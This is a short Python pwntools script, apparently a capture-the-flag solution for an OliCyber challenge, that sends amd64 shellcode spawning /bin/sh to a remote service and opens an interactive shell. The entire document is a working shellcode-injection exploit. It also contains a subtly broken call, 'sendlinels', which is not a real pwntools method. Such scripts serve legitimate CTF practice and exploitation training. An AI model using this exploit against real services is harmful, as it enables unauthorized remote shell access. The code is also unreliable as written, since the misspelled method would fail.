from pwn import *

def main():
    HOST = "software-20.challs.olicyber.it"
    PORT = 13003

    r = remote(HOST, PORT)    

    r.recvuntil(b"iniziare ...")
    r.sendline()

    asm_code = shellcraft.amd64.linux.sh()
    shellcode = asm(asm_code, arch='x86_64')

    r.recvuntil(b": ")
    print(f"Sending {str(len(shellcode))} bytes")
    r.sendline(str(len(shellcode)).encode())

    r.recvuntil(b": ")
    r.sendlinels(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()